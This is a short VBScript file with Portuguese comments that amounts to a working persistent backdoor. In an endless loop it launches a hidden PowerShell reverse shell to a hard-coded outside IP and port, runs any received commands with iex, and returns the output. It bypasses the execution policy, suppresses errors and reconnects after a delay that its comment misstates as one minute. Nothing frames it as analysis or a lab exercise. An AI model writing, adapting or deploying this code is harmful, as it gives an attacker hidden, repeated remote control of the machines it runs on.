On Error Resume Next

Dim ip: ip = "100.26.23.21"
Dim port: port = "3308"

Do While True
    Set ws = CreateObject("WScript.Shell")
    
    ' Comando PowerShell simplificado e testado
    Dim psCommand
    psCommand = "powershell -WindowStyle Hidden -Exec Bypass -Command """ & _
                "$client = New-Object System.Net.Sockets.TCPClient('" & ip & "', " & port & ");" & _
                "$stream = $client.GetStream();" & _
                "[byte[]]$bytes = 0..65535 | %{0};" & _
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {" & _
                "    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);" & _
                "    $sendback = (iex $data 2>&1 | Out-String);" & _
                "    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" & _
                "    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" & _
                "    $stream.Write($sendbyte, 0, $sendbyte.Length);" & _
                "    $stream.Flush()" & _
                "};" & _
                "$client.Close()""" & _
                ""

    ' Executa o comando
    ws.Run "cmd.exe /c " & psCommand, 0, False
    
    ' Espera 1 minuto antes de tentar novamente
    WScript.Sleep 460000
Loop